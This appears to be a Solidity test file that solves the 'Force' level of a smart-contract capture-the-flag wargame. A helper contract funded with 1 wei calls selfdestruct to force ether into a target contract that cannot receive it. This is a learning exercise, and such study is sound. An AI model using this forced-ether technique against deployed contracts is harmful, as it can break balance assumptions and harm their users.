// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {ForceFactory} from "../src/levels/07-ForceFactory.sol";
import {Force} from "../src/levels/07-Force.sol";

contract Emo {
    constructor()payable{} // solhint-disable no-empty-blocks
    function kms(address payable beneficiary) public {
        selfdestruct(beneficiary);
    }
}

contract ForceSolution is BaseTest {

    function solution(address payable target_) internal override{
        Force target = Force(target_);
        Emo emo = new Emo{value: 1}();
        emo.kms(payable(address(target)));
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new ForceFactory()));
    }
}
